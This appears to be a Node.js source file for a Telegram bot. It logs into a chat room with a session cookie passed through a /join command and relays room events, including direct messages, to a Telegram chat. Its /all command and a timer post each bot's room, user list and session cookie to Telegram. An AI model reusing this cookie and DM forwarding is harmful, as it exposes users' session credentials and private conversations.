const { Bot } = require('../lib/bot.js')
const fs = require('fs')
const { Telegraf } = require('telegraf')

const db = {'tok': '', 'chatID': ''}
var TG = new Telegraf(db.tok);
var logs = {}
var bot = {}

const chars = {
  "_": "\\_",
  "*": "\\*",
  "[": "\\[",
  "`": "\\`"
};
const reChar = new RegExp("_|\\*|\\[|`", "gi");

log2mkd = (type, e, room) => {
    let text = "";

    e.user = e.user.replace(reChar, m => chars[m]);
    e.text = e.text.replace(reChar, m => chars[m]);

    if (type === "msg") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "`: " } else { text += ": " } text += e.text; if (e.url) { text += " [URL](" + e.url + ")" } else { text += "" } return text;
    }
    else if (type === "me") {
        text += "Действие | " + "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "`: _" } else text += ": _"; text += e.text + "_"; if (e.url) { text += " [URL](" + e.url + ")" } else text += ""; return text;
    }
    else if (type === "dm") {
        text += "ЛС | " + "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "`: " } else text += ": "; text += e.text; if (e.url) { text += " [URL](" + e.url + ")" } else text += ""; return text;
    }
    else if (type === "join") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "` в чате." } else text += " в чате."; return text;
    }
    else if (type === "leave") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "` покинул(а) чат." } else text += " покинул(а) чат."; return text;
    }
    else if (type === "new-host") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "` стал(a) новым хостом." } else text += " стал(a) новым хостом."; return text;
    }
    else if (type === "kick") {
        text += "*" + bot.kname + "*"; if (bot.ktrip) { text += "`#" + bot.ktrip + "` был кикнут." } else text += " был кикнут."; return text;
    }
    else if (type === "ban") {
        text += "*" + bot.kname + "*"; if (bot.ktrip) { text += "`#" + bot.ktrip + "` был забанен." } else text += " был забанен."; return text;
    }
    else if (type === "room-profile") {
        text += "Название комнаты изменено на *" + room.name + "*."; return text;
    }
    else if (type === "new-description") {
        text += "Описание комнаты изменено на *" + room.desc + "*."; return text;
    }
    else if (type === "music") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "` поделился музыкой --- " + room.music.name + " [URL](" + room.music.url + ")" } else text += " поделился музыкой --- " + room.music.name + " [URL](" + room.music.url + ")."; return text;
    }

}

sendTg = (chat_id, type, e, roomLog) => {
    TG.telegram.sendMessage(db.chatID, log2mkd(type, e, roomLog), { parse_mode: "Markdown" });
}

checkTG = (ctx, callback) => {
    if (JSON.stringify(ctx.message.chat.id).match(db.chatID)) {
        callback();
    }
}

TG.command("join", (ctx) => {
    checkTG(ctx, () => {
        let cookie = ctx.message.text.replace("/join ", "");
        bot = new Bot();
        bot.cookie = cookie;
        bot.getReady(() => bot.startHandle());
        ctx.reply('Бот подключен.');

        bot.event(["msg", "dm", "me", "join", "leave", "new-host", "room-profile", "new-description", "music", "kick", "ban"], (u, m, url, trip, eventObject) => {
        	if ((eventObject.type === "music") || (u !== bot.profile.name)) {
                bot.getRoom(() => {
                    let title = "";
                    let url = "";

                    if (bot.room.np) {
                        title = bot.room.np.name;
                        url = bot.room.np.url;
                    }

                    room = {
                        name: bot.room.name,
                        desc: bot.room.description,
                        music: {
                            name: title,
                            url: url
                        }
                    };

                    sendTg(db.chatID, eventObject.type, eventObject, room);
                })
        	}
        });
    })
});

TG.command("leave", (ctx) => {
    checkTG(ctx, () => {
        bot = {};
        ctx.reply('Бот отключен.');
    });
});

TG.command("all", (ctx) => {
    checkTG(ctx, () => {
        if (logs) {
            let text = 'Боты\n';
            Object.keys(logs).forEach(x => {
                text += `\n\nКомната: ${logs[x].title}\nПользователи: ${logs[x].users.join(', ')}\nКуки: ${logs[x].cookie}`
            });
            ctx.reply(text);
        } else ctx.reply('Ботов нет.');
    });
});

setInterval(() => {
    let bots;
    try { bots = JSON.parse(fs.readFileSync("./conf/l.json", "utf8")); }
    catch { bots = false }
    if (bots) {
        Object.keys(bots).forEach(x => {
            if (!Object.keys(logs).includes(x)) {
                logs[x] = bots[x];
                TG.telegram.sendMessage(db.chatID, `Новый бот запущен\n\nКомната: ${bots[x].title}\nПользователи: ${bots[x].users.join(', ')}\nКуки: ${bots[x].cookie}`);
            }
        });
        Object.keys(logs).forEach(x => {
            if (!Object.keys(bots).includes(x)) {
                delete logs[x]
            }
        });
    }
}, 5000)
